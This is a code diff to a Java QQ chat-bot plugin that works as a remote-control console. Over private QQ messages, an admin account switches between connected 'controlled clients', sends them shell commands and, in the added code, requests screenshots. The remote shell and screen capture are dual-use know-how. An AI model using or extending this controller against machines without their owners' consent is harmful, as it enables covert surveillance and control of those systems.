@@ -1,5 +1,6 @@
 package com.example;
 
+import java.io.FileOutputStream;
 import java.io.IOException;
 import java.io.InputStream;
 import java.io.OutputStream;
@@ -164,6 +165,7 @@ public class Demo extends JcqAppAbstract implements ICQVer, IMsg, IRequest {
     public int privateMsg(int subType, int msgId, long fromQQ, String msg, int font) {
         // 这里处理消息
         //CQ.sendPrivateMsg(fromQQ, "你发送了这样的消息：" + msg + "\n来自Java插件");
+    	try {
         if(subType == 11 && fromQQ == adminQQ) //判断来自好友消息 并且是来自管理员的QQ账号
         {
         	if(msg.equals("startx"))
@@ -212,7 +214,7 @@ public class Demo extends JcqAppAbstract implements ICQVer, IMsg, IRequest {
 	        		CQ.sendPrivateMsg(adminQQ, sb.toString());
         		}else
         		{
-        			CQ.sendPrivateMsg(adminQQ, "请先通过EC退出[id="+iCurrentClientId+"]的控制状态");
+        			CQ.sendPrivateMsg(adminQQ, "请先通过ES退出[id="+iCurrentClientId+"]的控制状态");
         		}
         	}else if(msg.toCharArray()[0] == 'c' && msg.toCharArray()[1] == 'h')	//如果是ch命令 切换被控端
         	{
@@ -261,6 +263,26 @@ public class Demo extends JcqAppAbstract implements ICQVer, IMsg, IRequest {
         			CQ.sendPrivateMsg(adminQQ, "切换到被控端状态才可用shell命令");
         		}
         		
+        	}else if(msg.equals("getimage"))
+        	{
+        		Demo.CQ.logInfo("Menu", "getimage");
+        		if(start_flag == 2)	//已经切换到某个被控端了
+        		{
+					try {
+						CQ.sendPrivateMsg(adminQQ, "准备从 [id="+iCurrentClientId+"] 获取截图");
+	        			OutputStream os;
+						os = cCurrentClientInfo.s.getOutputStream();
+						os.write("getimage".getBytes("GBK"));	//发送"getimage"使客户端进入发送截图的状态
+						os.flush();
+						return MSG_IGNORE;
+					} catch (IOException e) {
+						// TODO 自动生成的 catch 块
+						e.printStackTrace();
+					}
+        		}else
+        		{
+        			CQ.sendPrivateMsg(adminQQ, "切换到被控端状态才可用shell命令");
+        		}
         	}else if(msg.equals("EC"))
         	{
         		Demo.CQ.logInfo("Menu", "EC");
@@ -311,11 +333,16 @@ public class Demo extends JcqAppAbstract implements ICQVer, IMsg, IRequest {
 						// TODO 自动生成的 catch 块
 						CQ.logInfo("shell异常", e.toString());
 						e.printStackTrace();
+						return MSG_IGNORE;
 					}
         		}
         	}
         	CQ.logInfo("shell", "状态: " + start_flag);
         }
+    	}catch(Exception e)
+    	{
+    		CQ.logInfo("Demo", e.toString());
+    	}
     	
     	return MSG_IGNORE;
     }
